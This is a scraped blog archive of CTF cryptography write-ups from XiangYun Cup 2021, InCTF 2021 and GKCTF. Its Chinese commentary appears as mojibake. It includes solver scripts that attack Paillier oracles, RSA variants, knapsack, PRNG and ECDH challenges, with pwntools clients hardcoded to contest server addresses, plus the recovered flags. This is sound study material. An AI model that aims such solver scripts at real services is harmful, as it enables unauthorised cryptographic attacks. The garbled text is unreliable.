ä¸Šæ˜æ–‡ä¸Š\nKEYæ¯”è¾ƒç‰¹åˆ«çš„æ˜¯ï¼Œå…¶ä¸­æ¯ä¸ªå…ƒç´ è¦ä¹ˆåœ¨KEY[R]ä¸Šï¼Œè¦ä¹ˆåœ¨KEY[R+1]ä¸Šï¼Œè¿™æ˜¯è¯¥éé¢„æœŸçš„åŸºç¡€\nself._send(\u0026#34;Give me m0.\u0026#34;) plaintext1 = int(self._recv().decode()) self._send(\u0026#34;Give me m1.\u0026#34;) plaintext2 = int(self._recv().decode()) if ( plaintext1 \u0026lt;= 2 or plaintext2 \u0026lt;= 2 or len(bin(plaintext1)) != len(bin(plaintext2)) ): return R = 2 * random.randint(0, 39) I = random.randint(0, 1) cipher1 = enc(n, g, plaintext1 * plaintext2 * KEY[R]) cipher2 = enc(n, g, plaintext1 * plaintext2 * KEY[R + 1]) self._send(\u0026#34;This is a ciphertext.\u0026#34;) self._send(str([cipher1, cipher2][I])) ç„¶åæˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸€æ¬¡å¯†æ–‡æ¥å¾—åˆ°æ˜æ–‡,ä½†ä¸èƒ½è¾“å…¥cipher1å’Œcipher2\ncipher = int(self._recv().decode()) plaintext = str(dec(n, g, LAM, cipher)) if int(plaintext) == plaintext1 * plaintext2 * KEY[R] or int(plaintext) == plaintext1 * plaintext2 * KEY[R+1]: return self._send(\u0026#34;This is the corresponding plaintext.\u0026#34;) self._send(plaintext) æ ¹æ®åŒæ€çš„åŸç†å¯ä»¥æ„é€ payloadç»•è¿‡æ£€æµ‹\n$C_0={C_1}^{m_1}=g^{m_1 * m_1 * m_2 * k}r^n \\;mod \\;n^2$\nè§£å¯†åå¯ä»¥å¾—åˆ°ï¼š\n$M\\div(m_1 * m_1 * m_2)=k$\næ­¤æ—¶å¦‚æœè¾“å…¥0å¦‚æœæŠ¥é”™åˆ™å½“å‰kå¯¹åº”çš„ä¸‹æ ‡æ˜¯0ï¼Œå¦åˆ™ä¸‹æ ‡ä¸º1\nåˆå› ä¸º\nassert key[0] == 119 and key[1] == 241 and key[2] == 718 and key[3] == 647 ç”±è¿™ä¸ªhintæˆ‘ä»¬çŸ¥é“æœåŠ¡å™¨ä¸Šé¢çš„keyæ˜¯ä¸å˜çš„\nåªè¦é‡å¤è®¿é—®æœåŠ¡å™¨å°±èƒ½æŠŠkeyè¡¨oracleå‡ºæ¥ç„¶åè§£å¾—keyåˆ°æˆ‘ä»¬è®°å½•çš„è¡¨é‡Œé¢å»æ‰¾å°±å¥½äº†\nsolution # import random import hashlib from math import gcd from pwn import * from icecream import * from MyRE import CatNum from itertools import product # from MyRE import * # from rich import * from rich.traceback import install install() # ----------------------------------- String = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz\u0026#34; # nc 47.104.85.225 57811 def pow1(): io.recvuntil(\u0026#39;?+\u0026#39;) s2 = io.recvuntil(\u0026#39;) \u0026#39;)[:-2] HASH = io.recvuntil(\u0026#39;\\n\u0026#39;)[3:-1] print(s2) print(HASH) for i in product(String,repeat=4): s1 = \u0026#39;\u0026#39;.join(i) # print(s1.encode())\\ s1 = s1.encode() s0 = s1+s2 # print(s0) HASH1 = hashlib.sha256(s0).hexdigest().encode() # print(HASH1) # input() if(HASH==HASH1): print(s1) io.sendline(s1) return def enc(n, g, m): while 1: r = random.randint(2, n - 1) if gcd(r, n) == 1: break c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2) return c def init(): # pow1() # io.interactive() buf = io.recvuntil(\u0026#39;round\u0026#39;) round = io.recvuntil(\u0026#39;Step 1\u0026#39;) ic(round) io.recvuntil(\u0026#39;KeyGen. This is my public key.\u0026#39;) buf = io.recvuntil(\u0026#39;Step \u0026#39;) ans = CatNum(buf) n,g = int(ans[0]),int(ans[1]) ic(n) ic(g) return n,g # ===================================== key0={130, 899, 903, 521, 142, 783, 530, 148, 416, 288, 550, 939, 427, 299, 558, 942, 685, 307, 566, 313, 577, 585, 718, 983, 349, 355, 611, 995, 614, 746, 751, 114, 498, 885, 119, 637, 638, 639} key1={128, 129, 646, 647, 521, 780, 396, 526, 653, 400, 783, 530, 148, 918, 281, 158, 286, 416, 548, 550, 936, 810, 939, 427, 299, 558, 942, 944, 430, 307, 309, 566, 313, 186, 577, 201, 585, 461, 718, 333, 977, 727, 216, 983, 860, 355, 613, 614, 232, 745, 746, 877, 237, 241, 113, 114, 244, 885, 119, 888, 121, 123, 637, 638, 639} def get_index(k): if(k in key0): return \u0026#39;0\u0026#39; else: return \u0026#39;1\u0026#39; def oracle(n,g): io.recvuntil(\u0026#39;Please give me one decimal ciphertext.\\n\u0026#39;) c = enc(n,g,123321123321123321123321) io.sendline(str(c)) io.recvuntil(\u0026#39;Step 3\u0026#39;) io.recvline() # s3 m1 = 787 m2 = 929 io.recvuntil(\u0026#39;Give me m0.\\n\u0026#39;) io.sendline(str(m1)) io.recvuntil(\u0026#39;Give me m1.\\n\u0026#39;) io.sendline(str(m2)) io.recvuntil(\u0026#39;This is a ciphertext.\\n\u0026#39;) buf = io.recvline() ans = CatNum(buf) c1 = int(ans[0]) # print(buf,c1) # init x1 = enc(n,g,787) c1x1 = pow(c1,m1,n**2) # ic(c1x1) io.sendline(str(c1x1)) io.recvuntil(\u0026#39;This is the corresponding plaintext.\\n\u0026#39;) buf = io.recvline() # print(ans) ans = CatNum(buf) tmp = int(ans[0]) io.recvuntil(\u0026#39;-\u0026gt; c0 , m1 -\u0026gt; c1)?\\n\u0026#39;) k = (tmp)//(m1*m2*m1) ic(k) _01 = get_index(k) io.sendline(_01) res = io.recvline() print(res) # io.interactive() return res,k time=0 # nc 47.104.85.225 57811 io = remote(\u0026#39;47.104.85.225\u0026#39;,57811) pow1() for i in range(100): n,g = init() res,k = oracle(n,g) if(b\u0026#39;Sorry\u0026#39; in res): print(f\u0026#39;{k}:0\u0026#39;) key0.add(k) time=0 io.close() io = remote(\u0026#39;47.104.85.225\u0026#39;,57811) pow1() else: sleep(0.25) print(f\u0026#39;{k}:1\u0026#39;) key1.add(k) time+=1 if(time==32): print(\u0026#39;get it\u0026#39;) print(io.recv(2048)) exit() print(f\u0026#39;key0={key0}\u0026#39;) print(f\u0026#39;key1={key1}\u0026#39;) print(time) ic| round: b\u0026#39; 32 Step 1\u0026#39; ic| n: 140359393736491083554637764633966036595869523810831521796100389946301014713501052438423015898275061604402441271059379191254720192715521217765512578594812234847906891823150303725078568490730815789232226736630007558775806211165296878777428640046549542601742670073385256102038588867770586061404269183834130922097 ic| g: 140359393736491083554637764633966036595869523810831521796100389946301014713501052438423015898275061604402441271059379191254720192715521217765512578594812234847906891823150303725078568490730815789232226736630007558775806211165296878777428640046549542601742670073385256102038588867770586061404269183834130922098 ic| k: 130 b\u0026#39;Good! You are right\\n\u0026#39; 130:1 get it b\u0026#39;flag{e87fdfb6-8007-4e1c-861f-5bde3c8badb3}\\n\u0026#39; [*] Closed connection to 47.104.85.225 port 57811 myRSA # å°æ•°å­¦é¢˜ï¼Œåˆ©ç”¨å„ç§å§¿åŠ¿æ¶ˆå»zå¯¹è§£å¯†å¾—å½±å“\næ ¸å¿ƒç‚¹\ndef encry(message,key,p,q,e): k1,k2 = key[random.randint(0,127)],key[random.randint(0,127)] x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) y = 2*p*q + p + q z = k1 + k2 c = pow(b2l(message),e,p*q) return x * c + y * c + z # enc é¦–å…ˆ\n$è®¾t=p+q$\n$(enc-z)/c=(x+y)-4n=t^3-t^2+t$\nä½†ç”±äº $f(t)=t^3-t^2+t-9999$ çš„å›¾åƒå‡ ä¹æ˜¯ä¸€æ¡ç›´çº¿ï¼Œæˆ‘ä»¬æ¨æ–­ï¼Œæ­¤æ—¶zå¯¹äºè§£è¿™ä¸ªæ–¹ç¨‹æ²¡æœ‰å®è´¨æ€§çš„å½±å“\næµ‹è¯•åå‘ç°ç¡®å®å¯ä»¥æ¶ˆå»ç¬¬ä¸€æ¬¡åŠ å¯†æ—¶zçš„å½±å“\nè§£å¯†æ—¶ä¹Ÿå¯ä»¥ç”¨x+yæ¶ˆå»zå¯¹flagçš„å½±å“\nz//(x+y)=0\nfrom Crypto.Util.number import * from Crypto.Util.number import getPrime,bytes_to_long as b2l import libnum from gmpy2 import iroot from icecream import * import sympy as sp # å¯¼å…¥sympyåŒ…ã€ def getpq(n,e,enc,c): tmp = 400000 ic(tmp) ans = enc//c -tmp -4*n x = sp.Symbol(\u0026#39;x\u0026#39;) # å®šä¹‰ç¬¦å·å˜é‡ f = x**3 - x**2 + x - ans # å®šä¹‰è¦æ±‚è§£çš„ä¸€å…ƒä¸‰æ¬¡æ–¹ç¨‹ ans = sp.solve(f) # print(ans) t = int(ans[2].round()) ic(t) tmp = iroot(t*t-4*n,2) ic(tmp) if(tmp[1] == True): delta = tmp[0] p = (t+delta)//2 ans = t**3 - t**2 + t print(n%p) ic(p) return p # ä¸€æ¬¡äº¤äº’åå¾—åˆ°çš„æ•°æ® n = 66027874281672625418586014781126070908243950646389324074550248999679090401150270793389452270314828298481437497840416396018574761898600856029902467560028361877554457938912404358968210921272837218306889478597234820590780596868027285957738861052042217870708996313230729115851397741357365848182263953315379303203 e = 65537 message = b\u0026#39;1231231312312312313123\u0026#39; c = pow(b2l(message),e,n) enc = 2786282534107784071949674754303734020650420550514064517704448066809278965224884310691670432441397979710035489386642473027744366146283566077172758576117265010888225901430814453103910642061532363684990980080593171873048076522753507082554621333455105446034271978972878134597921516292423901550995709181303022297139396128082022193615685724911328311390083321186035987746342068856533118816750276771278003232809361817465525887406183533073435476911136829775173155132394236172457900926847903014330722145729653282601258124899631596559793043199596264295846181613188399943356771658381560774428425036945242894731920547142207496951001372212394788053725065262462489938796299464287972476543278196732420981982981923866883740677815684307375214870832207719694203331026829445710224285190480 flagenc = 78903156043541822956852921255839504785260043170754244208159263853595508405000661899479307588531494172830632220991906679919999441798497272603229277113581316208572288228086544225197245626229321664099299589135332933949675253738548931053641537046898654150676091285693057337873250759686984233682913388477992334871253653295943818266597281224943136933411417199795127815822097900855479634034406709830823051590719193303685067733559940313006125179805670789881285419162909762014157603424444680011222474284489067733520824336575376527926069324059697680207015464280592590151869974781941122398578485426146276184697907560587701585522746826606269636562989809117072089021357481402267496699431701068851120069674664273560247308363437176623358041554600504472302094490793591097239195676611890 # ========================= p =getpq(n,e,enc,c) q = n//p print(n==p*q) # k = k1+k2 x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) y = 2*p*q + p + q z = enc-(x+y)*c print(z) # print(z==k) flagc = (flagenc)//(x+y) ic(z//(x+y)) # q=n//p # print(q) # n=p*q phi=(p-1)*(q-1) d = libnum.invmod(e,phi) print(long_to_bytes(pow(flagc,d,n))) # bytes_to_long() # long_to_bytes() \u0026#39;\u0026#39;\u0026#39; return x * c + y * c + z \u0026#39;\u0026#39;\u0026#39; # flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1} Challenge-attachment # attachment å’Œ20å¹´ç›¸æ¯”,è¯¸ç¥é»„æ˜è¡Œä¸ºå‡å°‘äº†ï¼Œä½†æ˜¯ä»æœ‰è¿·æƒ‘æ“ä½œï¼Œæ¯”å¦‚æ”¾é¢˜ç§’è§£,ä¸è§£ç­¾åˆ°é¢˜å»è§£é«˜éš¾é¢˜çš„æ“ä½œ\n","date":"23 August 2021","permalink":"/achieve/ctf/%E7%A5%A5%E4%BA%912021/","section":"archive","summary":"","title":"WriteUp for crypto in ç¿”äº‘ber 2021"},{"content":"\rWriteUp for InCTF # gold_digger # def encrypt(msg, N,x): msg, ciphertexts = bin(bytes_to_long(msg))[2:], [] for i in msg: while True: r = random.randint(1, N) if gcd(r, N) == 1: bin_r = bin(r)[2:] c = (pow(x, int(bin_r + i, 2), N) * r ** 2) % N ciphertexts.append(c) break return ciphertexts The main problem\nc = (pow(x, int(bin_r + i, 2), N) * r ** 2) % N if $flag_i$ is 1 ,the bin_r + i well be odd\nelse the $r+i$ well be even\nwe can determine the flag by calculating Jacobi symbol of c to N\nsolution # from Crypto.Util.number import * import gmpy2 from data import ct N = 76412591878589062218268295214588155113848214591159651706606899098148826991765244918845852654692521227796262805383954625826786269714537214851151966113019 x = 72734035256658283650328188108558881627733900313945552572062845397682235996608686482192322284661734065398540319882182671287066089407681557887237904496283 plaintext = \u0026#39;\u0026#39; for line in ct: if gmpy2.jacobi(line,N) == -1: plaintext += \u0026#39;1\u0026#39; else: plaintext += \u0026#39;0\u0026#39; print(long_to_bytes(int(plaintext,2))) # inctf{n0w_I_4in7_73ll1ng_u_4_g0ldd1gg3r} Lost Baggag # In this challenge , we need to analyze a backpack encryption system\nthe challenge give us only pubkey and cipher\nsoï¼Œi tried Lattice reduction algorithm to solve it\nsagemath lattice reduction codeï¼š\nimport pickle data = pickle.load(open(\u0026#39;enc.pickle\u0026#39;, \u0026#39;rb\u0026#39;)) cip = data[\u0026#39;cip\u0026#39;] pbkey = data[\u0026#39;pbkey\u0026#39;] print(len(pbkey)) S = cip M = pbkey n = len(M) L = matrix.zero(n + 1) for row, x in enumerate(M): L[row, row] = 2 L[row, -1] = x L[-1, :] = 1 L[-1, -1] = S f = open(\u0026#39;LLLdata.txt\u0026#39;,\u0026#39;a+\u0026#39;) res = L.LLL() for i in range(144): ans = list(res[i]) f.write(str(ans)+\u0026#39;\\n\u0026#39;) print(ans) The matrix is looks like: $$\\begin{pmatrix} 2\u0026amp;0\u0026amp;0\u0026amp;\\cdots\u0026amp;0\u0026amp;PK_1\\\\ 0\u0026amp;2\u0026amp;0\u0026amp;\\cdots\u0026amp;0\u0026amp;PK_2 \\\\ 0\u0026amp;0\u0026amp;2\u0026amp;\\cdots\u0026amp;0\u0026amp;PK_3 \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \u0026amp; \\vdots \\\\ 0\u0026amp;0\u0026amp;0\u0026amp;\\cdots\u0026amp; 2 \u0026amp; PK _ n \\\\ 1\u0026amp;1\u0026amp;1\u0026amp;\\cdots \u0026amp;1\u0026amp;ct \\end{pmatrix} $$\nLets check the LLLdata.txt\nfortunately,I find a vector only have 1 and -1\ntry to docode it and get the flag\nfrom Crypto.Util.number import * ans = [-1, 1, -1, -1, -1, -1, -1, 1, -1, -1, -1, -1, -1, -1, 1, 1, -1, -1, -1, 1, 1, -1, -1, 1, 1, 1, -1, 1, -1, -1, 1, 1, 1, -1, 1, 1, 1, -1, -1, 1, -1, -1, -1, -1, -1, 1, -1, 1, 1, 1, -1, 1, -1, -1, 1, 1, -1, 1, -1, -1, 1, -1, -1, 1, -1, -1, -1, -1, -1, 1, -1, 1, -1, 1, -1, 1, -1, -1, 1, 1, 1, -1, 1, 1, -1, -1, -1, 1, -1, -1, -1, 1, -1, -1, -1, 1, -1, -1, 1, -1, -1, -1, -1, 1, 1, -1, -1, 1, 1, -1, -1, 1, 1, 1, -1, 1, -1, -1, -1, 1, -1, -1, 1, 1, 1, -1, -1, 1, 1, -1, -1, -1, 1, -1, -1, 1, -1, 1, 1, -1, 1, -1, -1, 1] flag = \u0026#39;\u0026#39; for i in ans: if(i == -1): flag+=\u0026#39;1\u0026#39; else: flag+=\u0026#39;0\u0026#39; msg = int(flag[::-1],2) print(long_to_bytes(msg)) flag = \u0026#39;\u0026#39; for i in ans: if(i == -1): flag+=\u0026#39;0\u0026#39; else: flag+=\u0026#39;1\u0026#39; msg = int(flag[::-1],2) print(long_to_bytes(msg)) # inctf{wr5_m4_b4g?} Right Now Generator # This challenge is easy after analysing\nItâ€™s more like a reverse than a crypto\u0026hellip;.\nanalysis and implement # Our major trouble is to find The Inverse function of functioncs below,\nAnd how we think about finding seed-sequence from a-sequence given by the attachment\ndef wrap(self, pr=True): hsze = self.sze//2 for i in range(self.sze): r1 = self.seed[i] r2 = self.seed[(i+hsze)%self.sze] self.seed[i] = ((r1^self.pad)*r2)%self.mod self.ctr = 0 def next(self): a, b, c, d = (self.seed[self.ctr^i] for i in range(4)) mod = self.mod k = 1 if self.ctr%2 else 2 a, b, c, d = (k*a-b)%mod, (b-c)%mod, (c-d)%mod, (d-a)%mod self.ctr += 1 if self.ctr==64: self.wrap(pr=False) return a With a simple algebraic calculation\nWe can write out Inverse function easily\nfrom a-sequence get seed-sequence:\ndef from_aa_get_seed(aa): seed=[] for i in range(0,63,4): tmp = aa[i:i+4] a1,a2,a3,a4 = tmp s0 = (a1+a2)%mod s1 = (2*a2+a1)%mod s2 = (a3+a4)%mod s3 = (2*a4+a3)%mod seed = seed + [s0,s1,s2,s3] return seed inv_wrap:\ndef inv_wrap(seed): for i in range(32): r2 = seed[i] r1 = ((seed[i+32]*libnum.invmod(r2,mod))%mod)^pad seed[i+32]=r1 for i in range(32): r2 = seed[i+32] r1 = ((seed[i]*libnum.invmod(r2,mod))%mod)^pad seed[i] = r1 return seed Combined them into decryption code\nSolution # import random, hashlib, os, gmpy2, pickle import libnum from libnum.modular import invmod from Crypto.Util.number import * from Crypto.Cipher import AES # ----------------------------------- pad = 0xDEADC0DE sze = 64 mod = 18446744073709551629 def inv_wrap(seed): for i in range(32): r2 = seed[i] r1 = ((seed[i+32]*libnum.invmod(r2,mod))%mod)^pad seed[i+32]=r1 for i in range(32): r2 = seed[i+32] r1 = ((seed[i]*libnum.invmod(r2,mod))%mod)^pad seed[i] = r1 return seed def from_aa_get_seed(aa): seed=[] for i in range(0,63,4): tmp = aa[i:i+4] a1,a2,a3,a4 = tmp s0 = (a1+a2)%mod s1 = (2*a2+a1)%mod s2 = (a3+a4)%mod s3 = (2*a4+a3)%mod seed = seed + [s0,s1,s2,s3] return seed def from_leak_get_aa(leak): aa =[] for i in range(0,1024,16): tmp =leak[i:i+16] s = bytes.fromhex(tmp) tmp = bytes_to_long(s) aa.append(tmp) return aa def next(seed1,i): ctr = i a, b, c, d = (seed1[ctr^i] for i in range(4)) mod = 18446744073709551629 k = 1 if ctr%2 else 2 # 1 å’Œ 2 äº¤æ›¿å‡ºç°,å¯æ§ a, b, c, d = (k*a-b)%mod, (b-c)%mod, (c-d)%mod, (d-a)%mod return a enc = {\u0026#39;cip\u0026#39;: \u0026#39;71d39d37d3c03e08b82d81ae3b4be658e2dbdaee6a73d73a3e88271f423db30f0422d4fb9475ceef281a746afa86eaee\u0026#39;, \u0026#39;iv\u0026#39;: \u0026#39;cbf411655acfd7f670968ccf44d74e05\u0026#39;, \u0026#39;leak\u0026#39;: \u0026#39;3aeba43302ab9ad0df898103fc0223be23f5ec10f62ad48744c2ec06bc4ac9b2290aff5f5d17fc2ff2a1115e657ddced0f12238ca12b076bf85fed0ce621202d159c014907e39ba7373ada78a4dea3a76bfb9ff09a8f10705cd95a47edd743fde25f32ab545bf98bba1344bed511b0c095ddede11b4a35bc02acb34d3aef46c56bfc9b668c82c0d3da76307dd87016e1a7df478cdefb98d4fe991088f478f24390fac3d4f0d0673d2801f37df421ab17cb72af64a8b21ebf9d73c3ef35a8bd5fe98c62a910ef8b859b86a58bf670fe544266bc37a36d3828e7397bac0b817f41522e76a68661b3e9952ed3d2eb7846b2f9cd2c1cc44eda2ac536eb826ce922afaa4c7d61ff3db9023cf2fff8fb34791954fbb1541f043fe26e92fb79f119fbe175bd1b551dd1225275a457580bef4301505f474060f39caad6d3172f17a9a21f68e66b59a13e817b0201dbdbcc1e6c1d80ab2e8d38f7f0a62d0bb3577da845643273b1743f5aac064422bdbd85358f6da726f9114c5553432d4f4e2f43f997975add7ea3b6a56b689ff84f7635815879e28d8c7421b979449f5bccb29cce745862610af8c99379c60e1205d5e1eda9d2f5243d4da4325ac142bd196d1777bd2d4f61eb355b7fca3e16295d05e8a21e75f010272ce159afb49fa3d4b97bd242304e34599f7bc8edf5b4430bb42b12437b7c27583d303043311afd56fae70a7d6b\u0026#39;} leak = enc[\u0026#39;leak\u0026#39;] aa = from_leak_get_aa(leak) seed = from_aa_get_seed(aa) seed_prev = inv_wrap(seed) out1 = \u0026#39;\u0026#39;.join([format(next(seed_prev,i), \u0026#39;016x\u0026#39;) for i in range(64)]) key = bytes.fromhex(out1) key = hashlib.sha256(key).digest()[:16] cip = enc[\u0026#39;cip\u0026#39;] iv = enc[\u0026#39;iv\u0026#39;] cip = bytes.fromhex(cip) iv = bytes.fromhex(iv) aes = AES.new(key, AES.MODE_CBC, iv) flag = aes.decrypt(cip) print(flag) # b\u0026#39;inctf{S1mpl3_RN65_r_7h3_b35t!_b35e496b4d570c16}\\x01\u0026#39; Eazy Xchange # there we can exchange gen_key into a simple form\ndef gen_key(G, pvkey): G = sum([i*G for i in pvkey]) return G def gen_key(G, pvkey): tmp = sum([i for i in pvkey]) return G*tmp and the tmp is small $(tmp \u0026lt;1024)$\nand there tell us $B=tmp*G$\ndef gen_bob_key(EC, G): bkey = os.urandom(4) B = gen_key(G, bkey) return B, bkey so\n$SS=tmp_1*tmp_2 * G$\nand $SS=tmp_1*tmp_2\u0026lt;1024 * 1024$\nWe can try out $tmp_1*tmp_2$ easily\nimport os, hashlib, pickle from tqdm import tqdm # ----------------------------------- from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad p = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF a = p - 3 b = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B EC = EllipticCurve(GF(p), [a, b]) G = EC.gens()[0] # å›ºå®šçš„ç‚¹ def decrypt(cip, key,iv): key = hashlib.sha256(str(key).encode()).digest()[:16] cipher = AES.new(key, AES.MODE_CBC, iv) return cipher.decrypt(cip) data = {\u0026#39;cip\u0026#39;: \u0026#39;9dcc2c462c7cd13d7e37898620c6cdf12c4d7b2f36673f55c0642e1e2128793676d985970f0b5024721afaaf02f2f045\u0026#39;, \u0026#39;iv\u0026#39;: \u0026#39;cbd6c57eac650a687a7c938d90e382aa\u0026#39;, \u0026#39;G\u0026#39;: \u0026#39;(38764697308493389993546589472262590866107682806682771450105924429005322578970 : 112597290425349970187225006888153254041358622497584092630146848080355182942680 : 1)\u0026#39;} FLAG = data[\u0026#39;cip\u0026#39;] iv = data[\u0026#39;iv\u0026#39;] FLAG = bytes.fromhex(FLAG) iv = bytes.fromhex(iv) x = 38764697308493389993546589472262590866107682806682771450105924429005322578970 y = 112597290425349970187225006888153254041358622497584092630146848080355182942680 G = EC(x,y) print(G) SS = G for i in tqdm(range(2,1024*1024)): SS = SS+G msg = decrypt(FLAG, SS.xy()[0],iv) if(b\u0026#39;inctf\u0026#39; in msg): print(msg) break # inctf{w0w_DH_15_5o_c00l!_3c9cdad74c27d1fc} Encrypted Operations # è¿™ä¸ªå¤ªå“ˆäººäº† å…¨æ˜¯cppï¼ˆæˆ‘tmç›´æ¥å“å‡ºæ¯è¯­ï¼‰ğŸ˜«ğŸ˜«ğŸ˜«\nå®¡äº†ä¸€å¤©\nå‘ç°å°åº¦è€å“¥è¿™ä¸ªvectorçš„ç†è§£å’Œæˆ‘ä¸ä¸€æ ·ï¼Œç¼ç¼è¡¥è¡¥ç»ˆäºæå‡ºæ¥äº†\nåæ­£è¿™ä¸ªé¢˜åº”è¯¥å¾ˆéš¾æœ‰å¤ç°ç¯å¢ƒäº†\n(å…¶å®èƒ½æŠŠhomomorphic_systemå¤å†™ä¸€éåº”è¯¥è¿˜æ˜¯å¯ä»¥çš„ï¼Ÿæ”¾åœ¨dockeré‡Œé¢è¿˜æ˜¯æ¯”è¾ƒå¥½éƒ¨ç½²çš„)\nå°±å¹²è„†ç®€å•è¯´ä¸€ä¸‹ä¸‰ä¸ªéƒ¨åˆ†çš„æ€è·¯å¥½äº†ğŸ«\nprat1\nfor (int x = 0; x \u0026lt; 20; x++) { for (int y = 0; y \u0026lt; 20; y++) { m[x][y] = ++val; } } int d = 20; int r = 3; int c = 3; for (int i = 0; i \u0026lt; 18; i++) { for (int j = 0; j \u0026lt; 18; j++) { for (int p = 0; p \u0026lt; 3; p++) { for (int q = 0; q \u0026lt; 3; q++) { mat.push_back(m[i + p][j + q]); } } } } for (int j = 0; j \u0026lt; int(mat.size()); j += 9) { v.push_back(slice(mat, j, j + 9));//åˆ‡ç‰‡çŸ©é˜µåŒ– } idx = Genrand(0, v.size() - 1); vector\u0026lt;int64_t\u0026gt; temp1(begin(v[idx]), end(v[idx])); vector\u0026lt;int64_t\u0026gt; mvector = temp1; sum1 = accumulate(mvector.begin(), mvector.end(), 0);//éšæœºå…ˆå»ä¸€ä¸ªåˆ‡ç‰‡æ±‚å’Œ FheEncrypt(mvector); EncryptedOperations(); vector\u0026lt;int64_t\u0026gt; p = FheDecrypt(); if (sum1 == 0) { cout \u0026lt;\u0026lt; \u0026#34;\\n\\nCHALLENGE CORRUPTED!!!!\u0026#34;; exit(0); } if (p[0] == sum1) cout \u0026lt;\u0026lt; \u0026#34;\\n\\nYou got all the encrypted operations right! Great!!\\n\\nNow on to the next\\n\\n\u0026#34;; else exit(0); æ‹¿å¯¼å¤–é¢è·‘ä¸€ä¸‹å‘ç°å…¶å®å°±æ˜¯å¯¹åˆ‡ç‰‡æ±‚å’Œï¼Œç”±äºtemp1é‡Œé¢æœ¬è´¨ä¸Šæ˜¯ä¸ªç­‰å·®æ•°åˆ—ï¼Œæ‰¾ä¸€ä¸‹è§„å¾‹å°±å¯ä»¥äº†\npart2åŒç†\npayload1\n9 0 0 0 * 1 y 189 0 0 0 + 1 n 189 0 0 0 + 1 n + 20 0 0 0 * 1 y 830 0 0 0 + 1 n level2 å¯¹ p1 p2 å–åä½¿å…¶æŠµæ¶ˆæ‰numVecé‡Œé¢é™¤äº†m1[row[2]]ä»¥å¤–çš„æ‰€æœ‰å‘é‡\nåœ¨ userinpç”Ÿæˆå¤„ï¼Œå¾€åå¤šé€‰äº†ä¸€ä½ï¼Œè¿™ä¸ªæ“ä½œå¯ä»¥åœ¨EncryptedOperationsä¸­å¯¹m1[row[2]]å³ç§»ä¸€ä½æŠµæ¶ˆæ‰å½±å“ï¼Œæœ€æœ‰ä¸€ä½å¹¶ä¸ä¼šæ¶ˆå¤±ï¼Œè€Œæ˜¯ä¼šå°†vectorçš„é•¿åº¦æ‰©å±•ä¸€ä½\np = vector\u0026lt;int64_t\u0026gt;(p.begin(), p.begin() + 5 + 1); exp\nfrom pwn import * from pwnlib.util.iters import random_permutation # crypto.challenge.bi0s.in 1221 data = \u0026#34;\u0026#34;\u0026#34;9 0 0 0 * 1 y 189 0 0 0 + 1 n 189 0 0 0 + 1 n + 20 0 0 0 * 1 y 830 0 0 0 + 1 n 0 0 0 0 0 \u0026gt; 1 n -1 -1 -1 -1 -1 * 1 n -1 -1 -1 -1 -1 * 1 n \u0026#34;\u0026#34;\u0026#34; io = remote(\u0026#39;crypto.challenge.bi0s.in\u0026#39;,1221) io.sendline(data) io.recvuntil(\u0026#39;flag\u0026#39;) io.recvuntil(\u0026#39;flag\u0026#39;) buf = io.recv(2048) if(b\u0026#39;inctf\u0026#39; in buf): print(buf) exit(0) # inctfi{m4st3r_0f_Encrypt3d_0p3r4t1on5_B3c0m3_u_H4v3!!} shell\nâ¯â¯ inctf 22:18 python3 -u \u0026#34;c:\\Users\\16953\\Desktop\\inctf\\Encrypted Operations\\src\\exp.py\u0026#34; [x] Opening connection to crypto.challenge.bi0s.in on port 1221 [x] Opening connection to crypto.challenge.bi0s.in on port 1221: Trying 34.106.211.122 [+] Opening connection to crypto.challenge.bi0s.in on port 1221: Done b\u0026#39;: inctfi{m4st3r_0f_Encrypt3d_0p3r4t1on5_B3c0m3_u_H4v3!!}\\n\\n\\nThankyou for using the srvice! Sucessfully performed all operatoions!!\\n\\n\\nExiting!!\u0026#39; [*] Closed connection to crypto.challenge.bi0s.in port 1221 Challenge-attachment # Attachment ","date":"15 August 2021","permalink":"/achieve/ctf/inctf2021/","section":"archive","summary":"","title":"WriteUp for crypto in InCTF2021"},{"content":"[toc]\ngkctf2021 6-25 è¡¥æ¡£ # XOR # from Crypto.Util.number import * from hashlib import md5 a = getPrime(512) b = getPrime(512) c = getPrime(512) d = getPrime(512) d1 = int(bin(d)[2:][::-1] , 2) n1 = a*b x1 = a^b n2 = c*d x2 = c^d1 flag = md5(str(a+b+c+d).encode()).hexdigest() print(\u0026#34;n1 =\u0026#34;,n1) print(\u0026#34;x1 =\u0026#34;,x1) print(\u0026#34;n2 =\u0026#34;,n2) print(\u0026#34;x2 =\u0026#34;,x2) è¿™ä¸ªé¢˜åŸºæœ¬æ˜¯é çº¦æŸæ¡ä»¶å¯¹å¤šä½™æƒ…å†µè¿›è¡Œå‰ªæï¼Œæ¡åˆ°è¿ç®—é‡åœ¨åˆç†èŒƒå›´å°±å¯ä»¥äº†\né¡ºåºä¸å˜æ—¶åªéœ€è¦è€ƒè™‘ä½ä½ï¼Œé™¤å¼€å¼‚æˆ–æ¡ä»¶å¤–è¿˜è®¡ ç®— $a*b =n;mod;2^{i}-1$ æ¥å¯¹å·²çŒœæµ‹æ•°æ®è¿›è¡Œä½ä½æ£€æµ‹\nè¿™æ˜¯ä¸€ç§æ¨¡ç³Šçš„æ¡ä»¶ï¼Œè¯¥æ¡ä»¶æ˜¯æœ€ç»ˆæ¡ä»¶çš„å¿…è¦æ¡ä»¶\né¡ºåºæ”¹å˜çš„æƒ…å†µï¼Œå¼‚æˆ–éœ€è¦è€ƒè™‘é«˜ä½ä½äº¤æ¢çš„æƒ…å†µï¼Œæ¯æ¬¡è¦å››ä¸ªbitåŒæ—¶è¿ç®—çœ‹æ˜¯å¦åŒæ—¶æ»¡è¶³ 